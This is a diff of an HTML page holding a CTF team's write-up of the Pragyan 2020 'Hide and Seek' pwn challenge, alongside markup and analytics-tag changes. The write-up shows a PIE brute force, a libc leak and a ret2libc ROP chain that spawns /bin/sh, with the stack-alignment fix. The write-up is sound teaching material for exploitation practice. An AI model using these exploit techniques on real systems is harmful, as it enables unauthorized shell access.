@@ -18,19 +18,19 @@
   
   
   <title>[Pwn] Pragyan 2020 - Hide and Seek | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Hide and Seek   Description: 150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost">
+  <meta name="description" content="Hide and Seek    Description:150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost">
 <meta name="keywords" content="rop,ret2libc,stack_overflow">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] Pragyan 2020 - Hide and Seek">
 <meta property="og:url" content="https://teamrocketist.github.io/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Hide and Seek   Description: 150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost">
+<meta property="og:description" content="Hide and Seek    Description:150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/0lL6GDk.png">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] Pragyan 2020 - Hide and Seek">
-<meta name="twitter:description" content="Hide and Seek   Description: 150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost">
+<meta name="twitter:description" content="Hide and Seek    Description:150pts Solvers 11 Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost">
 <meta name="twitter:image" content="https://i.imgur.com/0lL6GDk.png">
   <!-- Canonical links -->
   <link rel="canonical" href="https://teamrocketist.github.io/2020/02/24/Pwn-Pragyan-2020-Hide-and-Seek/index.html">
@@ -354,32 +354,21 @@
     <div class="article-entry marked-body" itemprop="articleBody">
       
         <blockquote>
-<p>Hide and Seek</p>
+<p>Hide and Seek </p>
 </blockquote>
 <blockquote>
-<p><strong>Description</strong>:<br>
-150pts</p>
+<p><strong>Description</strong>:<br>150pts</p>
 <p>Solvers 11</p>
 <p>Little Joe is lonely and has no one to play with him. So, his father built him a toy that can play hide and seek with him. However, Little Joe has lost his toy! Can you help him find it?</p>
 <p>First solvers: OpenToAll</p>
-<p><a href="https://mega.nz/#!ujgSBQaT!tCy4Nkkoz--jIJb9Ag4_kmeGO-X1mjXBNmcz5GuJY-s" target="_blank" rel="noopener">gps</a> 1760946c1646ecf61192e545c2e9ac4a<br>
-<a href="https://mega.nz/#!TmxwBAJA!pXFWRLZap_kHbepOZtyy-Kus9DSTRiq6xZXr2WKrgJc" target="_blank" rel="noopener">libc-2.27.so</a> 50390b2ae8aaa73c47745040f54e602f<br>
-nc <a href="http://ctf.pragyan.org" target="_blank" rel="noopener">ctf.pragyan.org</a> 17000</p>
+<p><a href="https://mega.nz/#!ujgSBQaT!tCy4Nkkoz--jIJb9Ag4_kmeGO-X1mjXBNmcz5GuJY-s" target="_blank" rel="noopener">gps</a> 1760946c1646ecf61192e545c2e9ac4a<br><a href="https://mega.nz/#!TmxwBAJA!pXFWRLZap_kHbepOZtyy-Kus9DSTRiq6xZXr2WKrgJc" target="_blank" rel="noopener">libc-2.27.so</a> 50390b2ae8aaa73c47745040f54e602f<br>nc ctf.pragyan.org 17000</p>
 </blockquote>
-<h3 id="intro"><a class="markdownIt-Anchor" href="#intro"></a> Intro</h3>
-<p>This challenge had a very <strong>few</strong> solves, maybe because <strong>most</strong> people gave up after the <a href="https://blog.rwx.kr/how-pragyan-ctf-2020-hacked/" target="_blank" rel="noopener">hack</a>. Another reason is probably because when trying to get a <strong>shell</strong> with system on the server it returns segmentation fault due to an <strong>alignment</strong> problem, this is an issue I also had in a previous ctf (CSAW 2019) and the fix is pretty simple as I will explain bellow.</p>
-<h3 id="extracting-info"><a class="markdownIt-Anchor" href="#extracting-info"></a> Extracting info</h3>
-<p>Everything is enabled besides the <strong>stack canary</strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec gpsu</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/hideandseek/gpsu'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>This challenge had a very <strong>few</strong> solves, maybe because <strong>most</strong> people gave up after the <a href="https://blog.rwx.kr/how-pragyan-ctf-2020-hacked/" target="_blank" rel="noopener">hack</a>. Another reason is probably because when trying to get a <strong>shell</strong> with system on the server it returns segmentation fault due to an <strong>alignment</strong> problem, this is an issue I also had in a previous ctf (CSAW 2019) and the fix is pretty simple as I will explain bellow.</p>
+<h3 id="Extracting-info"><a href="#Extracting-info" class="headerlink" title="Extracting info"></a>Extracting info</h3><p>Everything is enabled besides the <strong>stack canary</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec gpsu</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/hideandseek/gpsu'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
 <p>From the file command we know that the binary is <strong>dynamically linked</strong> so we know it’s going to use a shared library of libc.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file gpsu</span><br><span class="line">gpsu: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2b53545d7df75c5dd56122820cf4806f2be749d3, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
-<h3 id="vulnerability"><a class="markdownIt-Anchor" href="#vulnerability"></a> Vulnerability</h3>
-<p>There is an obvious <strong>buffer overflow</strong> vulnerability in scanf, we also partially got a <strong>leak</strong> of the <strong>PIE</strong> address, which is necessary if we want to leak addresses from the <strong>GOT</strong> and to build a <strong>ropchain</strong>:<br>
-<a data-fancybox="gallery" href="https://i.imgur.com/0lL6GDk.png" target="_blank" rel="noopener"><br>
-<img src="https://i.imgur.com/0lL6GDk.png" alt><br>
-</a></p>
-<h3 id="writing-the-exploit"><a class="markdownIt-Anchor" href="#writing-the-exploit"></a> Writing the exploit</h3>
-<p>First thing we want to do is to get the pie address some numbers from it we already know because they’re not affected by the ALSR:</p>
+<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>There is an obvious <strong>buffer overflow</strong> vulnerability in scanf, we also partially got a <strong>leak</strong> of the <strong>PIE</strong> address, which is necessary if we want to leak addresses from the <strong>GOT</strong> and to build a <strong>ropchain</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/0lL6GDk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0lL6GDk.png" alt><br></a></p>
+<h3 id="Writing-the-exploit"><a href="#Writing-the-exploit" class="headerlink" title="Writing the exploit"></a>Writing the exploit</h3><p>First thing we want to do is to get the pie address some numbers from it we already know because they’re not affected by the ALSR:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xXXXXXXXX?000</span><br></pre></td></tr></table></figure>
 <p>The ones we already know is the <strong>last 3</strong> which is <strong>3 zeros</strong>, the <strong>“Xs”</strong> are leaked from the <strong>binary</strong> from those printfs but we are missing one number which is denoted with a <strong>“?”</strong>. The solution to this is to brute-force <strong>this number</strong>, a <strong>4 bit</strong> bruteforce shouldn’t take much time even when connecting remotely.</p>
 <p>So to form the pie address we can do this in python:</p>
@@ -390,7 +379,7 @@ nc <a href="http://ctf.pragyan.org" target="_blank" rel="noopener">ctf.pragyan.o
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ /libc-database/find fgets 0x7f0916d25b20</span><br><span class="line">http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)</span><br><span class="line">$ /libc-database/download libc6_2.27-3ubuntu1_amd64</span><br><span class="line">Getting libc6_2.27-3ubuntu1_amd64</span><br><span class="line">  -&gt; Location: http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb</span><br><span class="line">  -&gt; Downloading package</span><br><span class="line">  -&gt; Extracting package</span><br><span class="line">  -&gt; Package saved to libs/libc6_2.27-3ubuntu1_amd64</span><br><span class="line">$ cp /libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so .</span><br></pre></td></tr></table></figure>
 <p>Next thing to do is to calculate the offsets:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FGETS = u64(r.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">LIBC = FGETS-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBC+next(libc.search(<span class="string">b'/bin/sh\x00'</span>))</span><br><span class="line">log.info(<span class="string">'FGETS 0x%x'</span>, FGETS)</span><br><span class="line">log.info(<span class="string">'LIBC 0x%x'</span>, LIBC)</span><br></pre></td></tr></table></figure>
-<p>Now its time to build a ropchain that executes <strong>system(&quot;/bin/sh\x00&quot;);</strong>, this is probably where most people got stuck, if we build a ropchain like this:</p>
+<p>Now its time to build a ropchain that executes <strong>system(“/bin/sh\x00”);</strong>, this is probably where most people got stuck, if we build a ropchain like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROP_CHAIN = p64(POPRDI) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ROP_CHAIN += p64(BINSH)</span><br><span class="line">ROP_CHAIN += p64(SYSTEM) <span class="comment"># system(rdi=&amp;/bin/sh);</span></span><br><span class="line">ROP_CHAIN += p64(MAIN)</span><br><span class="line">r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br></pre></td></tr></table></figure>
 <p>Locally everything runs smoothly but when running at the server it always segfaults , basically our payload needs to be aligned within a 16 byte multiple, so to fix the alignment on the remote machine we can just add another rop instruction <strong>ret</strong> between <strong>BINSH</strong> and <strong>SYSTEM</strong> which in the end doesn’t do anything but will fix the alignment on the server machine:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROP_CHAIN = p64(POPRDI) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ROP_CHAIN += p64(BINSH)</span><br><span class="line">ROP_CHAIN += p64(RET) <span class="comment"># ret  Won't work on server without this</span></span><br><span class="line">ROP_CHAIN += p64(SYSTEM) <span class="comment"># system(rdi=&amp;/bin/sh);</span></span><br><span class="line">ROP_CHAIN += p64(MAIN)</span><br><span class="line">r.sendlineafter(<span class="string">'---\n'</span>, <span class="string">b'A'</span>*<span class="number">38</span>+ROP_CHAIN)</span><br></pre></td></tr></table></figure>
@@ -583,16 +572,16 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-    <script defer type="text/javascript">
-(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C391950C2R"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-ga('create', 'UA-104385070-1', 'auto');
-ga('send', 'pageview');
-
+  gtag('config', 'G-C391950C2R');
 </script>
+
 
 
 
